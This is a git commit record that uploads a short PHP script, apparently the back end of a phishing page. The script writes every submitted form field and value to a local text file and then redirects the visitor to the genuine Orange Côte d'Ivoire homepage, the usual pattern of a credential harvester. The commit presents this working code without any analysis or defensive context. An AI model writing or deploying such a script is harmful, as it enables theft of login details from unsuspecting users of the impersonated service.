244ce55f98a7e6929445e81ba53df81b0bb41c9d
Leogeek006 <100889185+Leogeek006@users.noreply.github.com>
2022-03-04 02:07:50 +0000

    Add files via upload

---
+++ oklm.php
@@ -0,0 +1,14 @@
+<?php
+header ('Location:https://www.orange.ci/fr/accueil.html');
+$handle = fopen("merci.txt", "a");
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+
+?>
